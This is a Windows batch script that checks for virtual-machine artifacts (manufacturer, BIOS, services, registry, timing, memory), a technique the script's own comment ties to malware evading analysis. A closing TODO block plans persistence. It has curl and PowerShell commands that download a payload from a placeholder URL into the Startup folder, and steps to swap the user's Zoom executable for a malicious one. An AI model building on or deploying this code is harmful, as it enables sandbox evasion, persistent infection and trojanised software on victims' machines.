@echo off
setlocal EnableDelayedExpansion

echo Advanced Virtual Machine Detection...

:: Check for common VM manufacturer and model artifacts
wmic computersystem get manufacturer, model | findstr /i "VMware VirtualBox Microsoft QEMU Parallels Xen KVM" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific manufacturer or model detected.
    goto :end
)

:: Check BIOS for VM-specific strings
wmic bios get serialnumber, version | findstr /i "VMware VirtualBox VBOX Microsoft QEMU Parallels Xen" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific BIOS serial or version detected.
    goto :end
)

:: Check for hypervisor presence
systeminfo | findstr /i "hypervisor" | findstr /i "detected" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] Hypervisor presence indicates a virtual machine.
    goto :end
)

:: Check for VM-related services
sc query | findstr /i "vmms vmware virtualbox parallels vboxsvc" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] Virtual machine services detected.
    goto :end
)

:: Check for VM disk identifiers
wmic diskdrive get model, interfaceType | findstr /i "VMware VirtualBox VBOX QEMU Parallels" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] Virtual machine disk or interface detected.
    goto :end
)

:: Check for VM-specific network adapters
wmic nic get name, manufacturer | findstr /i "VMware VirtualBox Microsoft Parallels QEMU Xen" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific network adapter detected.
    goto :end
)

:: Timing-based detection (simplified, as precise timing is limited in batch)
:: Malware often checks for execution delays indicative of VM analysis
set startTime=%time%
ping 127.0.0.1 -n 2 > nul
set endTime=%time%
:: Calculate time difference (rough approximation in batch)
for /f "tokens=1-4 delims=:." %%a in ("%startTime%") do set /a startMs=%%a*360000+%%b*6000+%%c*100+%%d
for /f "tokens=1-4 delims=:." %%a in ("%endTime%") do set /a endMs=%%a*360000+%%b*6000+%%c*100+%%d
set /a timeDiff=%endMs%-%startMs%
if %timeDiff% LSS 100 (
    echo [DETECTED] Unusually fast execution time, possible VM environment.
    goto :end
)

:: Check for specific VM registry keys
reg query "HKLM\SOFTWARE" | findstr /i "VMware VirtualBox Parallels Microsoft QEMU" > nul
if %errorlevel% equ 0 (
    echo [DETECTED] VM-specific registry keys detected.
    goto :end
)

:: Check for low memory (VMs often have less memory allocated)
for /f "tokens=2 delims==" %%a in ('wmic computersystem get totalphysicalmemory /value') do set mem=%%a
set /a memMB=%mem:~0,-6%
if %memMB% LSS 2048 (
    echo [DETECTED] Low physical memory (%memMB% MB), typical of VM environments.
    goto :end
)

:: If no VM indicators are found
echo [NOT DETECTED] This system does not exhibit common virtual machine characteristics.

:: TODO
:: Persistence as user
::    Download script to startup
::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
::        powershell.exe -c Invoke-WebRequest -uri <urltopayload> -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat"

::    Download script to Temp and execute with Registry Key

::    ZoomUpdate EXE change
::        Check if Zoom is in user profile
::        change name of zoom exe
::        Download malicious Zoom exe to folder

:end
pause
endlocal
